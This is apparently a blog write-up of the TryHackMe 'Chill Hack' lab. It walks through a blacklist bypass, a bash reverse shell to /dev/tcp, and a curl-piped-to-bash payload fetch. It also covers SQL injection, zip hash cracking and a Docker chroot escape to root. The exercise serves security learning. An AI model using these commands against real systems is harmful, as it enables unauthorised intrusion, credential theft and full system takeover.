---
layout: post
title: "Chill Hack"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [rustscan, dirsearch, ftp, Command-Injection, reverse-shell, ssh-keygen, port-forwarding, sql-injection, steghide, unzip, JTR, zip2john, base64, GTFObins, docker]
image: ../../assets/img/posts/chillhack.png 

---

## Description

|**Room**|[Chill Hack](https://tryhackme.com/room/chillhack)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Anurodh](https://tryhackme.com/p/Anurodh)|

---

Deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a 10.10.154.222
```

![image](https://user-images.githubusercontent.com/67465230/187364762-dbdcb76c-727a-469c-b0fa-c032397ded3d.png)

There are 3 open ports. Let's scan them using using nmap,

```bash
nmap -sC -sV -p21,22,80 10.10.154.222 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/187364796-247291c3-b5d6-4c6a-9bc7-80031c1c8eb7.png)

Looks like port 21 is running ftp service with anonymous login enabled, port 22 is running ssh service & port 80 is running webserver.

Let's access ftp service,

```bash
ftp 10.10.154.222
```

![image](https://user-images.githubusercontent.com/67465230/187364836-b04ceec4-71cc-4338-af5f-a4b59bde84f8.png)

We get in.

Now, enumerating directory,

![image](https://user-images.githubusercontent.com/67465230/187364883-78c796f7-41d6-4405-bcec-2d2bd9e7fa13.png)

there is a note.txt file. Maybe someone left a note for us. 

We can download this file on our system using get command,

```bash
get note.txt
```

Now, reading the content of note.txt file,

![image](https://user-images.githubusercontent.com/67465230/187365160-b5992dc1-50e3-449c-a308-3a99491e386f.png)

The message is for Anurodh user, left by Apaar user which says that there is kind of filtering on strings being put in command (maybe command injection?). Let's find out.

Visit http://10.10.154.222,

![image](https://user-images.githubusercontent.com/67465230/187365221-5ee5fb7a-2797-42a9-9939-14d5586bb0fc.png)

and we get a webpage which is nothing interesting. 

Now, we can find hidden directories

```bash
dirsearch -u http://10.10.154.222 -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187365247-46c02aa7-ea04-4ed0-9b18-93ac9969c7b9.png)

from some directories, there is a /secret directory that dirsearch found. 

Let's find out what's there by visiting http://10.10.154.222/secret,

![image](https://user-images.githubusercontent.com/67465230/187365281-5cae0ed0-dc96-4a52-acc9-576d7fc8c34e.png)

we have a input box where we can pass commands and execute them.

Now, issue `id` command,

![image](https://user-images.githubusercontent.com/67465230/187365324-e4b87cfb-f3c2-42e3-8d35-a3d44635ac4d.png)

we can see that we are www-data user. We have command execution!

Now, issue `ls` command to list directory content,

![image](https://user-images.githubusercontent.com/67465230/187365385-8770211c-a27b-4029-a4c2-7a4cbd986c3d.png)

we got an alert. It seems that we can't execute this command.

Let's try to execute ls again but this time, put a backslash between ls and s,

```bash
l\s -la
```

![image](https://user-images.githubusercontent.com/67465230/187365441-4d2870c1-a05b-45b6-98b7-c78c12b378de.png)

it executed successfully and list the files and directories out in the response. With this, we have successfully bypassed the filtering.

Next, we can look at php file running the commands and see what other commands are blacklisted by script,

```bash
c\at index.php
```

![image](https://user-images.githubusercontent.com/67465230/187365493-6fbdaeb7-47da-497f-99a2-4a3eaf435027.png)

There are some commands which are filtered,

```bash
nc, python, bash, php, perl, rm, cat, head, tail, python3, more, less, sh, ls
```

These words are mostly used to get reverse shells on any system. But we now have to bypass the restriction.

Creating a one-liner bash shell file named shell.sh,

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.9.2.168/4444 <&1'" > shell.sh
```

Next we need to start a server using `python3 -m http.server` and also start a listener so that it can catch a connection `nc -nvlp 4444`.

Now, we can download the script using curl command and piped it's contents over to bash using command below,

```bash
curl http://10.9.2.168:8000/shell.sh | b\ash
```

>The importance of using bash was to ensure that the file doesn’t get saved on the disk and this comes in handy when you can’t write to the location where the script is running since the downloaded contents are automatically passed to a bash instance.

After we executed the command, we had the shell waiting for us,

![image](https://user-images.githubusercontent.com/67465230/187366960-b5d31ba2-c137-4ab8-94a9-ec76b9c3ddba.png)

Now, let's start a server using `python3 -m http.server` and we need to download the linpeas script on remote machine and make it executable,

```bash
wget http://10.9.2.168:8000/linPEAS -O linpeas.sh
chmod +x linpeas.sh
```

Let's run the script using `./linpeas.sh` and after scrolling down there are 2 things which seems interesting:

1. There was a port,9001 that was only exposed to localhost

![image](https://user-images.githubusercontent.com/67465230/187367991-dc50a1f7-7113-4619-9b8d-b0749160ec3f.png)

2. We can run the script called helpline.sh as a different user without knowing the user's password

![image](https://user-images.githubusercontent.com/67465230/187368045-00943b25-7929-4e8a-b8c2-2723df8095af.png)

Let's take a look at the script,
![image](https://user-images.githubusercontent.com/67465230/187368090-8b8b96d9-24bb-4d74-be27-8722d48d4e91.png)
it is vulnerable to command injection! 

>The user supplied input is directly passed to a bash instance and we could use this to our advantage and execute a bash shell and get a bash instance as the Apaar user.

Let's try this out,

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

![image](https://user-images.githubusercontent.com/67465230/187368154-e368224b-8dcf-4cd2-8e34-2e67b3139d72.png)

Giving input of /bin/bash and we have successfully elevated our privileges from www-data user.

Now, let's get a terminal first,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Enumerating directory and we can find out local.txt (user flag) file,

![image](https://user-images.githubusercontent.com/67465230/187368205-6ec0c401-add2-4fd3-9f7d-48da3b08949b.png)

Next step, we can drop the ssh key on the server and use SSH to do a reverse tunneling of the port we want to access back on the box.

Create SSH key pair suing `ssh-keygen` binary,

```bash
ssh-keygen -f apaar
```

![image](https://user-images.githubusercontent.com/67465230/187368252-c506ba54-2c11-4a74-abd7-7a3b5c2bb18a.png)

Now copy the content of public key and paste this in remote machine's authorized_keys,

![image](https://user-images.githubusercontent.com/67465230/187368541-a6149101-206e-4e29-83af-2f28b553bae4.png)

Now, we need to give suitable permissions on the private key named apaar, 

```bash
chmod 600 apaar
```

Now, using -L argument in SSH to perform reverse port forwarding of local port to connect back to my local box port 9001,

```bash
ssh -L 9001:127.0.0.1:9001 -i apaar apaar@10.10.152.155
```

![image](https://user-images.githubusercontent.com/67465230/187368621-17081c5f-7229-45ec-a3e9-8c30f69e9037.png)

Next, now we can try to access the port from our local vm using browser,

![image](https://user-images.githubusercontent.com/67465230/187368947-0c7f35c0-d473-4c1b-a3ed-5492d2cf6d8a.png)

we can now see the Customer Portal login page.

Now, back in our remote machine, if we take a good look at files in /var/www/files,

![image](https://user-images.githubusercontent.com/67465230/187368998-0c910ceb-3045-41fd-8189-3dd4aac013d7.png)

we can see that we have an account.php file there. As name suggest, this file might contain some juicy data. 

Lets take a look inside account.php file,

![image](https://user-images.githubusercontent.com/67465230/187369109-880d8253-99c6-4ee3-b458-fc81ff568910.png)

looking at the script, it can perform sql queries without doing any proper filtering/ sanitization of user input. And this leads to SQL injection vulnerability.

Now, we can try to inject manually crafted username and password in order to perform SQL injection successfully, we can pass username & password as 

```md
' or 1=1#:
```

![image](https://user-images.githubusercontent.com/67465230/187369179-5c4a990f-c3f1-4627-936b-efd3c8102727.png)

and we got into the system. Looks like we have to dive deep into the dark, *sigh*.

Let's download the image,

![image](https://user-images.githubusercontent.com/67465230/187369243-a87ef753-8c45-48d3-8611-dfff95c793f0.png)

Now, we need to extract the hidden data with steghide,

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

![image](https://user-images.githubusercontent.com/67465230/187369282-1d5943d3-fdcf-4e41-904a-fe0b2adb7c73.png)

it will extract the data into backup.zip file.

Now, all we need to unzip the file, `unzip backup.zip`

![image](https://user-images.githubusercontent.com/67465230/187369326-5e2a2d52-ab4e-4c28-b8dc-9500a88d0eb7.png)

it won't extract the data at all. We have to provide the password to unzip the file.

Now, we can use a utility to convert zip file into crackable hash, 

```bash
zip2john backup.zip > backup_hash
```

Now, we can use JTR to crack the hash,

```bash
john backup_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/187369369-22287bf5-fc5d-484f-af78-ac02331e9a1a.png)

Now, we can unzip this file by providing the password,

![image](https://user-images.githubusercontent.com/67465230/187369497-ea7a0c28-85da-45a1-86e2-f7da75b94315.png)
Data got extracted in source_code.php.

Reading the content of source_code.php file,

![image](https://user-images.githubusercontent.com/67465230/187369648-fc9062d7-a433-4c0d-9c72-9359b8ec50c2.png)
we got password encoded in base64.

We can actually decode this string to get the password,

```bash
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```

![image](https://user-images.githubusercontent.com/67465230/187369687-71f64bc7-1027-4ceb-9271-707fee89c70c.png)

Now, all that left is to switch to anurodh user,

```bash
su - anurodh
```

![image](https://user-images.githubusercontent.com/67465230/187369728-877bcead-0d39-4cd5-ac6e-9e3bb0b1f25b.png)

and we are member of **docker** group, result of `id` command.

Now, we can go to [Docker](https://gtfobins.github.io/gtfobins/docker/)
![image](https://user-images.githubusercontent.com/67465230/187369793-f9bed299-8606-4cec-9c69-2952b22ceddd.png)
we can escape the shell use this command. 

Let's try out,

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![image](https://user-images.githubusercontent.com/67465230/187369858-f8e195d6-a5fa-4b7e-ac21-92575b011f6e.png)
and we become root. Now, we can navigate to /root directory and grab our root flag.

Now, let's look on how to crack the hashes. Earlier, in the room I found the file named index.php.

![image](https://user-images.githubusercontent.com/67465230/187369888-25f55126-0b58-4841-a34f-58f948f43fe7.png)

Let's check the content of this file,

![image](https://user-images.githubusercontent.com/67465230/187369930-bea1b5fc-3183-4af3-bbc3-c7ef30dfb723.png)

it has mysql creds.

So I tried to login into mysql using these credentials,

```sql
mysql -u root -Dwebportal -p
```

![image](https://user-images.githubusercontent.com/67465230/187369976-0dfdab4e-0cff-4c6c-8d72-5ce4a0e1142e.png)

and we got access to the database.

With these commands, we can enumerate tables and find the necessary credentials of the users,

```sql
show databases;
use webportal;
show tables;
select * from users;
```

![image](https://user-images.githubusercontent.com/67465230/187370024-5ca3726a-b7bd-4314-adac-275803535ac8.png)

We can take these hashes and identify their type using `hash-identifier` tool and after identification, I got to know that both are MD5.

Now, since we know that we have MD5 hash, we can crack these hashes,

```bash
hashcat.exe -m 0 crack.txt rockyou.txt -O
```

![image](https://user-images.githubusercontent.com/67465230/187370098-600d4f1d-16f7-441f-a190-574b5ecb679c.png)
![image](https://user-images.githubusercontent.com/67465230/187370138-2f8e4ff5-176c-4e9a-b193-c461e0466776.png)

now we got the cracked hashes. But unfortunately, these hashes won't work when I tried to switch to other user.